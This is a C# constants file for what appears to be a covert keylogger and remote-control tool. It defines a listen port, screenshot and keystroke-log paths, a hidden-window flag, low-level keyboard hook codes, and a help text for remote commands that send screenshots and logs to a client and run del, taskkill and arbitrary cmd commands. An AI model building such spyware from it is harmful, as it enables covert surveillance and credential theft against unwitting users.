namespace constantsLib
{
    public static class Constants
    {
        #region net constants
        public const int ListenPort = 7788;
        #endregion

        #region other constants
        public const string ScreenshotPath = @"\screen.jpg";
        public const string LogPath = @"\log.dat";

        public const int SW_HIDE = 0;
        public const uint BUFSIZ = 1024 * 1024;//1024*5000
        #endregion

        #region keyboard constants
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public const int WM_KEYUP = 0x0101;
        public const int WM_SYSKEYDOWN = 0x0104;
        public const int WM_SYSKEYUP = 0x0105;

        public const int KF_REPEAT = 0X40000000;

        public const int HKL_NEXT = 1;

        public const int VK_SHIFT = 0x10;  // SHIFT
        public const int VK_CONTROL = 0x11;    // CONTROL
        public const int VK_MENU = 0x12; // ALT
        public const int VK_CAPITAL = 0x14; // CAPS LOCK

        public const string USALang = "США";
        public const string RuLang = "Русская";
        #endregion

        #region reply constants
        public const string HelpReply = @"
                                Cmd syntax: <cmd> <params> <Enter>
                                Cmd list:
                                    screen - создает screenshot сервера и отправляет клиенту
                                    log - отправляет лог-файл клиенту
                                    ipconfig
                                    del
                                    taskkill
                                E.g.: 
                                    cmd taskkill /IM notepad.exe /f
                                    cmd tasklist
                                    cmd ipconfig /all
                                    cmd notepad.exe
                                    del path_to_file";
        public const string NoCmdProcessReply = "\tCommand process had no reply.\t";
        #endregion
    }

}
